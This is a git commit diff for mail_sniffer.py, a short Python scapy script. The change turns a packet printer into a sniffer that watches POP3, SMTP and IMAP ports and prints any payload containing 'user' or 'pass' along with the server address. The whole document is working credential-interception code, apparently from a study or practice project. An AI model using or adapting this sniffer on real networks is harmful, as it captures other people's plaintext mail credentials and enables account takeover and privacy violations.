01f693ae777cf2c755c4c43d9d0eeebfced9e49d
Veras Nt <d.verasnt@gmail.com>
2017-10-16 14:50:28 -0500

    added some filters and improved the callback function

--- mail_sniffer.py
+++ mail_sniffer.py
@@ -2,7 +2,12 @@ from scapy.all import *
 
 #callback for all the packages that match the filter
 def packet_callback(packet):
-	print packet.show()
+    if packet[TCP].payload:
+        mail_packet = str(packet[TCP].payload)
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print"[*] SERVER: %s " % packet[IP].dst
+            print"[*] %s " % packet[TCP].payload
+    
 
 #trigger the sniffer
-sniff(prn=packet_callback,count=1)
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
